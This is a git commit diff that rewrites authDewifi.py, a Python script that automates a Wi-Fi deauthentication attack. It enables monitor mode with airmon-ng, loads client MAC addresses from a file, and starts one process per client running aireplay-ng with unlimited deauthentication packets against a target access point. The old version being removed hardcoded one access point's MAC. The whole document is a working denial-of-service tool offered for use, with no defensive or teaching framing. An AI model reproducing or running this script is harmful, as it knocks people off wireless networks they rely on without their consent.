eafef147a8cc8d9cd5ff1e5acaf3e58e0abd88fb
Wajahat Ahmad <48358590+WjahatAhmad@users.noreply.github.com>
2020-07-24 04:48:43 -1100

    Update authDewifi.py

--- authDewifi.py
+++ authDewifi.py
@@ -1,58 +1,69 @@
+import sys 
+import re 
 import os
-import re
-import threading
+from time import sleep
+import multiprocessing 
 
 
-class Wifi:
-    def __init__(self):
-        self.mac_list = []
-        self.adapter = 'wlan1'
+Wifi_mac = '00:00:00:00:00:00'
 
-    def find_adapter(self):
-        command = os.popen('sudo ifconfig')
-        command_output = command.read()
-        wlan_find = re.findall('\s*wlan\d', command_output)
-        adapter = wlan_find[1]
-        print(self.adapter)
-        self.adapter = adapter.strip()
-        return self.adapter
+wifi_adapter = str(input("Please Enter The Wifi Adapter You Want Yo Use ==> "))
 
-    def find_macs(self):
-        mac_file = str(input('Please Enter The FIle Contain Mac_Address => '))
-        with open(mac_file, 'r') as mac_file:
-            mac_list = []
-            for line in mac_file.readlines():
-                line = line.strip()
-                mac_list.append(line)
-            self.mac_list = mac_list
-        return self.mac_list
-
-    def start_moniter_mode(self):
-        command = 'sudo airmon-ng start' + self.adapter
-        start = os.popen(command)
-        return start
-
-    def de_authentic(self, mac):
-        for address in mac:
-            print('Sent Dauth Packted To The MAC : ' + address)
-            command = 'sudo aireplay-ng -0 1 -a C8:3A:35:96:A8:49  -c ' + address + ' ' + self.adapter + 'mon'
-            command = command.strip()
-            command = os.popen(command)
-            command.read()
+if wifi_adapter[-3:] == 'mon':
+	wifi_adapter = wifi_adapter.replace(wifi_adapter, wifi_adapter[:-3])
 
 
-    def de_auth_all(self):
-        thread = threading.Thread(target=self.de_authentic, args=[self.mac_list])
-        thread.start()
-        # for mac_address in range(len(self.mac_list)):
-        #     print(mac_address)
-        #     # mac_address = threading.Thread(target=self.de_authentic, args=self.mac_list[mac_address])
-        #     # mac_address.start()
+def checkmode(wifi_adapter):
+	try:
+		command_result  = os.popen('sudo iwconfig '+ wifi_adapter).read()
+		pattren = re.compile(r'\s*Mode:(.*?)\s')
+		result = re.findall(pattren, command_result)
+		Mode =  result[0]
+		return Mode
+	except IndexError:
+		command_result  = os.popen('sudo iwconfig '+ wifi_adapter + 'mon' ).read()
+		pattren = re.compile(r'\s*Mode:(.*?)\s')
+		result = re.findall(pattren, command_result)
+		Mode =  result[0]
+		return Mode
 
+def enable_moniter_mode(wifi_adapter):
+	commnad = os.popen('sudo airmon-ng start '+ wifi_adapter)
+	commnad.read()
+	os.system('clear')
+	print('Moniter Mode Enabled')
 
-if __name__ == '__main__':
-    wifi = Wifi()
-    # wifi.find_adapter()
-    wifi.find_macs()
-    # wifi.start_moniter_mode()
-    wifi.de_auth_all()
+def check_moniter(wifi_adapter):
+	if checkmode(wifi_adapter) == 'Managed':
+		enable_moniter_mode(wifi_adapter)
+		command = 'airodump-ng '+ wifi_adapter+' -c 5'
+		return True
+
+	else:
+		print('Already In Moniter Mode:')
+		command = 'airodump-ng '+ wifi_adapter+' -c 5'
+		return True
+
+def disable_moniter(wifi_adapter):
+	wifi_adapter = wifi_adapter + 'mon'
+	command = os.popen('sudo airmon-ng stop '+ wifi_adapter)
+	command.read()
+	print('Disabled Moniter MOde')
+
+def load_macs():
+	mac_address_list = []
+	with open('macs.txt', 'r') as macs:
+		for line in macs.readlines():
+			line = line.strip()
+			mac_address_list.append(line)
+		return mac_address_list
+
+def de_auth(wifi_adapter,mac, packets, wifi_mac):
+		command = os.popen('aireplay-ng -0 '+ str(packets)+' -a ' + str(wifi_mac) + ' -c '+ str(mac) +' ' + str(moniter_adapter))
+		print(command.read())
+
+moniter_adapter = wifi_adapter+'mon'
+
+if check_moniter(wifi_adapter):
+	for mac in load_macs():
+		multiprocessing.Process(target=de_auth,args=(moniter_adapter,mac,0,Wifi_mac)).start()
